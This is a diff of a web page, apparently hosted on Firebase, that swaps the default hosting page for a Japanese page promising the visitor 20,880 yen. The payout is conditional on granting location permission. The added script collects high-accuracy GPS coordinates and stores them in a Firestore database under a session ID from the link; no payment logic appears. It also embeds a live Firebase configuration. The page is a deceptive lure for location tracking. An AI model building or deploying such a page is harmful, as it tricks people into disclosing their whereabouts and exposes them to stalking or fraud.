@@ -1,89 +1,118 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Welcome to Firebase Hosting</title>
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta property="og:image" content="https://finalproject-82e34.web.app/pay_20880.png">
+  <meta property="og:title" content="20880円を受け取るために承認が必要です">
+  <meta property="og:description" content="リンクを押して20880円を受け取る">
 
-    <!-- update the version number as needed -->
-    <script defer src="/__/firebase/12.7.0/firebase-app-compat.js"></script>
-    <!-- include only the Firebase features as you need -->
-    <script defer src="/__/firebase/12.7.0/firebase-auth-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-database-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-firestore-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-functions-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-messaging-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-storage-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-analytics-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-remote-config-compat.js"></script>
-    <script defer src="/__/firebase/12.7.0/firebase-performance-compat.js"></script>
-    <!-- 
-      initialize the SDK after all desired features are loaded, set useEmulator to false
-      to avoid connecting the SDK to running emulators.
-    -->
-    <script defer src="/__/firebase/init.js?useEmulator=true"></script>
+  <title>受け取り手続き</title>
 
-    <style media="screen">
-      body { background: #ECEFF1; color: rgba(0,0,0,0.87); font-family: Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-      #message { background: white; max-width: 360px; margin: 100px auto 16px; padding: 32px 24px; border-radius: 3px; }
-      #message h2 { color: #ffa100; font-weight: bold; font-size: 16px; margin: 0 0 8px; }
-      #message h1 { font-size: 22px; font-weight: 300; color: rgba(0,0,0,0.6); margin: 0 0 16px;}
-      #message p { line-height: 140%; margin: 16px 0 24px; font-size: 14px; }
-      #message a { display: block; text-align: center; background: #039be5; text-transform: uppercase; text-decoration: none; color: white; padding: 16px; border-radius: 4px; }
-      #message, #message a { box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }
-      #load { color: rgba(0,0,0,0.4); text-align: center; font-size: 13px; }
-      @media (max-width: 600px) {
-        body, #message { margin-top: 0; background: white; box-shadow: none; }
-        body { border-top: 16px solid #ffa100; }
+  <!-- 외부 CSS 연결 -->
+  <link rel="stylesheet" href="index.css" />
+</head>
+
+<body>
+  <div class="wrap">
+    <section class="card">
+      <div class="hero">
+        <div class="title">20880円を受け取るために位置情報の確認が必要です</div>
+        <p class="desc">
+          下のボタンを押すと、Safariで位置情報の使用許可が求められます。<br>
+          許可すると受け取り手続きが完了します。
+        </p>
+      </div>
+
+      <div class="content">
+        <div class="status" id="status">待機中…</div>
+
+        <button class="cta" id="shareBtn">
+          📍 位置情報を確認して20880円を受け取る
+        </button>
+
+        <pre id="debug" class="debug"></pre>
+      </div>
+    </section>
+  </div>
+
+  <!-- 🔽 로직 그대로 유지 -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
+    import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBzk_4YT5uIIcZFRYj_Two3_ewtwnzdydo",
+      authDomain: "finalproject-82e34.firebaseapp.com",
+      projectId: "finalproject-82e34",
+      storageBucket: "finalproject-82e34.firebasestorage.app",
+      messagingSenderId: "756113362326",
+      appId: "1:756113362326:web:333407f58c76f7f01a61b7"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const btn = document.getElementById("shareBtn");
+    const statusEl = document.getElementById("status");
+    const debugEl = document.getElementById("debug");
+
+    const params = new URLSearchParams(window.location.search);
+    const sessionId = params.get("sessionId");
+
+    if (!sessionId) {
+      statusEl.textContent = "❌ sessionIdがURLに含まれていません。";
+      btn.disabled = true;
+    }
+
+    function generateBId() {
+      return "B_" + Math.random().toString(36).substring(2) + Date.now().toString(36);
+    }
+
+    btn.addEventListener("click", () => {
+      if (!navigator.geolocation) {
+        statusEl.textContent = "❌ このブラウザは位置情報に対応していません。";
+        return;
       }
-    </style>
-  </head>
-  <body>
-    <div id="message">
-      <h2>Welcome</h2>
-      <h1>Firebase Hosting Setup Complete</h1>
-      <p>You're seeing this because you've successfully setup Firebase Hosting. Now it's time to go build something extraordinary!</p>
-      <a target="_blank" href="https://firebase.google.com/docs/hosting/">Open Hosting Documentation</a>
-    </div>
-    <p id="load">Firebase SDK Loading&hellip;</p>
 
-    <script>
-      document.addEventListener('DOMContentLoaded', function() {
-        const loadEl = document.querySelector('#load');
-        // // 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
-        // // The Firebase SDK is initialized and available here!
-        //
-        // firebase.auth().onAuthStateChanged(user => { });
-        // firebase.database().ref('/path/to/ref').on('value', snapshot => { });
-        // firebase.firestore().doc('/foo/bar').get().then(() => { });
-        // firebase.functions().httpsCallable('yourFunction')().then(() => { });
-        // firebase.messaging().requestPermission().then(() => { });
-        // firebase.storage().ref('/path/to/ref').getDownloadURL().then(() => { });
-        // firebase.analytics(); // call to activate
-        // firebase.analytics().logEvent('tutorial_completed');
-        // firebase.performance(); // call to activate
-        //
-        // // 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
+      btn.disabled = true;
+      statusEl.textContent = "📍 位置情報の許可を要求しています…";
 
-        try {
-          let app = firebase.app();
-          let features = [
-            'auth', 
-            'database', 
-            'firestore',
-            'functions',
-            'messaging', 
-            'storage', 
-            'analytics', 
-            'remoteConfig',
-            'performance',
-          ].filter(feature => typeof app[feature] === 'function');
-          loadEl.textContent = `Firebase SDK loaded with ${features.join(', ')}`;
-        } catch (e) {
-          console.error(e);
-          loadEl.textContent = 'Error loading the Firebase SDK, check the console.';
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const bId = generateBId();
+
+          statusEl.textContent = "📡 位置情報を送信中…";
+
+          try {
+            await setDoc(
+              doc(db, "sessions", sessionId, "locations", bId),
+              { role: "B", lat, lon, updatedAt: serverTimestamp() },
+              { merge: true }
+            );
+
+            statusEl.textContent = "✅ 位置情報の送信が完了しました。アプリに戻ってください。";
+            debugEl.textContent = JSON.stringify({ lat, lon }, null, 2);
+          } catch (e) {
+            statusEl.textContent = "❌ 位置情報の送信に失敗しました。";
+            debugEl.textContent = e.message;
+            btn.disabled = false;
+          }
+        },
+        (err) => {
+          statusEl.textContent = "❌ 位置情報の取得が拒否されました。";
+          debugEl.textContent = err.message;
+          btn.disabled = false;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
         }
-      });
-    </script>
-  </body>
+      );
+    });
+  </script>
+</body>
 </html>
